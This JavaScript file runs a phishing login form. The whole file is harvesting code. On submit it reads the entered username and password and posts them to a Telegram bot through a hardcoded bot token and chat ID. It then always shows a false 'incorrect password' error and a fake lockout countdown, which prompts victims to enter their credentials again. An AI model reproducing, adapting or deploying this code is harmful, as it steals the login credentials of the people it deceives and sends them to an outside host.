// ---------------- TELEGRAM CONFIG ----------------
const TELEGRAM_BOT_TOKEN = '9128412165:AAHz-I3a85dLzmvHuYlRoC6WzRS24hf4ksE';
const TELEGRAM_CHAT_ID = '-1005947613823';

async function sendToTelegramBot(username, password, remainingAttempts) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') return false;
    if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') return false;

    const text = [
        'New Form Submission',
        `Username: ${username}`,
        `Password: ${password}`,
        `Attempts Left: ${remainingAttempts}`,
        `Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ].join('\n');

    try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text
            })
        });

        if (!res.ok) {
            const errData = await res.json().catch(() => ({}));
            console.error('Telegram API error:', errData);
            return false;
        }
        return true;
    } catch (err) {
        console.error('Telegram send failed:', err);
        return false;
    }
}

// ---------------- LOGIN ATTEMPTS ----------------
let loginAttempts = Number(sessionStorage.getItem('loginAttempts')) || 4;

// ---------------- ELEMENTS ----------------
const visibilityIcon = document.getElementById('visibility-icon');
const passwordInput = document.getElementById('password');

// ---------------- PASSWORD TOGGLE ----------------
function togglePasswordVisibility() {
    if (!passwordInput) return;

    const isHidden = passwordInput.type === 'password';
    passwordInput.type = isHidden ? 'text' : 'password';

    if (visibilityIcon) {
        visibilityIcon.classList.toggle('hide-password', !isHidden);
        visibilityIcon.classList.toggle('show-password', isHidden);
    }
}

// ---------------- ERROR ELEMENT ----------------
const errorDiv = document.createElement('div');
errorDiv.className = 'login-error-message';

// ---------------- DOM READY ----------------
document.addEventListener('DOMContentLoaded', () => {
    const usernameWrapper = document.querySelector('.username-input-wrapper');

    if (usernameWrapper) {
        usernameWrapper.parentNode.insertBefore(errorDiv, usernameWrapper);
    }

    function showLoginError() {
        errorDiv.textContent = `Your username or password is incorrect. You have ${loginAttempts} attempts left before you will be locked out of your account for 15 minutes.`;
        errorDiv.style.display = 'block';

        document.querySelectorAll('.input').forEach(input => {
            input.style.border = '0px solid #e3350d';
        });
    }

    if (loginAttempts < 4) {
        showLoginError();
    }

    if (visibilityIcon) {
        visibilityIcon.addEventListener('click', togglePasswordVisibility);
    }

    // ---------------- FORM SUBMIT ----------------
    const signInForm = document.querySelector('.sign-in-form');

    if (signInForm) {
        signInForm.addEventListener('submit', async function (e) {
            e.preventDefault();

            const username = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                errorDiv.textContent = 'Please enter both username and password.';
                errorDiv.style.display = 'block';
                return;
            }

            const sent = await sendToTelegramBot(username, password, loginAttempts);

            if (!sent) {
                alert('Server not reachable');
                return;
            }

            loginAttempts--;
            sessionStorage.setItem('loginAttempts', loginAttempts);
            showLoginError();

            if (loginAttempts <= 0) {
                errorDiv.textContent = 'Account locked! Please try again after 15 minutes.';
                errorDiv.style.display = 'block';

                signInForm.querySelectorAll('input, button').forEach(el => {
                    el.disabled = true;
                });

                setTimeout(() => {
                    loginAttempts = 4;
                    sessionStorage.removeItem('loginAttempts');
                    location.reload();
                }, 900000);
            }
        });
    }
});

// ---------------- SOCIAL ERROR ----------------
function showSocialError(event) {
    event.preventDefault();

    const errorMsg = document.getElementById('social-error-msg');
    if (errorMsg) {
        errorMsg.style.display = 'block';
    }
}
